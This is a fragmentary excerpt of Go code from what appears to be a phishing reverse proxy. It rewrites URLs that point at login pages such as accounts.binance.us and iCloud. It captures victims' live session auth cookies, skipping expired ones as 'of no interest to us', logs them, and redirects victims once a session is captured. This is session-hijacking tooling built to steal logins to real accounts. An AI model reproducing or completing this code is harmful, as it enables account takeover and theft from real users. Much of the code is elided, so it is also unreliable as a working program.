        ...
        if pl != nil {
          ...
          if len(qs) > 0 {
            for gp := range qs {
              for i, v := range qs[gp] {
                qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
              if qs[gp][i] == "https://www.test.com" { // https://accounts.binance.us:443
                qs[gp][i] = "https://www.icloud.com" // https://accounts.anydomain.com:443
              }
              }
            }
            req.URL.RawQuery = qs.Encode()
  ...
  p.Proxy.OnResponse().
    DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
      ...
      for _, ck := range cookies {
          ...
          if pl.isAuthToken(c_domain, ck.Name) {
            ...
            if ok && (s.IsAuthUrl || !s.IsDone) {
              if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
                ...
                log.Debug("[%d] ZZZZZAUTHZZZZZZ %s", ps.Index, is_auth)
        ...
        log.Debug("[%d] ck Domain intercept! %s", ps.Index, ck.Domain)
      }
      if ck.String() != "" {
        resp.Header.Add("Set-Cookie", ck.String())
        log.Success("[%d] add set cookie", ps.Index)
      }
      if is_auth {
      ...
      if pl != nil && ps.SessionId != "" {
        s, ok := p.sessions[ps.SessionId]
        if ok && s.IsDone {
          if s.RedirectURL != "" && s.RedirectCount == 1 {
            if stringExists(mime, []string{"application/json"}) {
              ...
              resp := goproxy.NewResponse(resp.Request, "application/json", http.StatusFound, "")
              if resp != nil {
...
func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
  if len(p.cfg.redirectUrl) > 0 {
    ...
    resp := goproxy.NewResponse(req, "application/json", http.StatusFound, "")
    if resp != nil {
